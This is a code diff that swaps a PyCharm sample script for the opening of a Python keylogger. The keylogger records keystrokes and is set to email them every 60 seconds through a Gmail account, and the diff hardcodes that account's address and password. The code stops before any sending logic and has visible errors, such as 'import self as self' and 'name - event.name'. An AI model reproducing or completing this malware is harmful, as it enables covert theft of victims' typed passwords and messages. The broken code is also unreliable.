@@ -1,16 +1,41 @@
-# This is a sample Python script.
+import keyboard
+import smtplib  # for sending email using SMTP protocol (gmail)
+from threading import Timer
+from datetime import datetime
 
-# Press Shift+F10 to execute it or replace it with your code.
-# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
+# initializing parameters
+import self as self
+
+SEND_REPORT_EVERY = 60  # seconds
+EMAIL_ADDRESS = "pythonkeylogger@gmail.com"
+EMAIL_PASSWORD = "C4uhUmEZVG8ikx4"
 
 
-def print_hi(name):
-    # Use a breakpoint in the code line below to debug your script.
-    print(f'Hi, {name}')  # Press Ctrl+F8 to toggle the breakpoint.
+class KeyLogger:
+    def __init__(self, interval, report_method="email"):
+        self.interval = interval  # time between every report, defined by SEND_REPORT_EVERY
+        self.report_method = report_method
+        self.log = ""  # keystrokes stored here
 
+        # record start and end dates
+        self.start_dt = datetime.now()
+        self.end_dt = datetime.now()
 
-# Press the green button in the gutter to run the script.
-if __name__ == '__main__':
-    print_hi('PyCharm')
+    def callback(self, event):
+        """"
+        Is called whenver a keyboard event occurs ie.
+        A key is released
+        """
+        name - event.name
+        if len(name) > 1:  # if special key
+            if name == "space":
+                name = " "
+            elif name == "enter":
+                name = "[ENTER]\n"  # add newline
+            elif name == "decimal":
+                name = "."
+            else:
+                name = name.replace(" ", "_")
+                name = f"[{name.upper()}]"  # formatted string literals
 
-# See PyCharm help at https://www.jetbrains.com/help/pycharm/
+        self.log += name  # add to total log
